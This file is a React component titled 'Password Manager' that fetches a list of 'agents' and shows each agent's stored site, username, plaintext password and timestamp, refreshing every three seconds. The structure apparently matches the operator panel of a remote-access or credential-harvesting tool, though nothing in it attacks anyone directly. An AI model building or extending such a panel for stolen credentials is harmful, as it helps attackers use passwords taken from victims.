import React, { useEffect, useState } from "react";
import { Card, CardHeader, CardTitle, CardContent } from "./ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "./ui/table";
import { Input } from "./ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "./ui/select";
import { toast } from "./ui/sonner";
import { useSocket } from "./SocketProvider";

type Entry = { site: string; username: string; password: string; time?: string };
type VaultAgent = { id: string; count?: number };

export function PasswordManager() {
  const { socket } = useSocket();
  const [agents, setAgents] = useState<VaultAgent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>("");
  const [entries, setEntries] = useState<Entry[]>([]);
  const [filter, setFilter] = useState("");
  const [loading, setLoading] = useState(false);

  const fetchAgents = async () => {
    try {
      const res = await fetch("/api/vault/agents");
      if (!res.ok) throw new Error("Agents fetch error");
      const data = await res.json();
      const list: VaultAgent[] = Array.isArray(data?.agents) ? data.agents : [];
      setAgents(list);
    } catch (e) {
      toast.error("Cannot load agents");
    }
  };

  const fetchEntries = async (agentId: string) => {
    if (!agentId) {
      setEntries([]);
      return;
    }
    try {
      setLoading(true);
      const res = await fetch(`/api/vault/${agentId}`);
      if (!res.ok) throw new Error("Entries fetch error");
      const data = await res.json();
      const list: Entry[] = Array.isArray(data?.entries) ? data.entries : [];
      setEntries(list);
    } catch (e) {
      toast.error("Cannot load vault entries");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchAgents();
  }, []);

  useEffect(() => {
    if (selectedAgent) fetchEntries(selectedAgent);
  }, [selectedAgent]);

  useEffect(() => {
    const t = setInterval(() => {
      fetchAgents();
      if (selectedAgent) fetchEntries(selectedAgent);
    }, 3000);
    return () => clearInterval(t);
  }, [selectedAgent]);

  const filtered = entries.filter(
    (e) =>
      e.site.toLowerCase().includes(filter.toLowerCase()) ||
      e.username.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader className="flex flex-col gap-3">
          <div className="flex items-center justify-between">
            <CardTitle>Password Manager</CardTitle>
          </div>
          <div className="flex items-center gap-3">
            <div className="w-72">
              <Select value={selectedAgent} onValueChange={setSelectedAgent}>
                <SelectTrigger>
                  <SelectValue placeholder="Select agent" />
                </SelectTrigger>
                <SelectContent>
                  {agents.map((a) => (
                    <SelectItem key={a.id} value={a.id}>
                      {a.id}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <Input
              value={filter}
              onChange={(v) => setFilter(v.target.value)}
              placeholder="Filter by site or username"
              className="w-60"
              disabled={!selectedAgent}
            />
          </div>
        </CardHeader>
        <CardContent>
          {!selectedAgent ? (
            <div className="text-center text-muted-foreground py-10">
              Select an agent to view saved credentials
            </div>
          ) : (
            <div className="border rounded-md overflow-hidden">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Site</TableHead>
                    <TableHead>Username</TableHead>
                    <TableHead>Password</TableHead>
                    <TableHead>Time</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filtered.map((e, idx) => (
                    <TableRow key={idx}>
                      <TableCell>{e.site}</TableCell>
                      <TableCell>{e.username}</TableCell>
                      <TableCell>{e.password}</TableCell>
                      <TableCell>{e.time || ""}</TableCell>
                    </TableRow>
                  ))}
                  {filtered.length === 0 && (
                    <TableRow>
                      <TableCell colSpan={4} className="text-center text-muted-foreground">
                        No entries
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
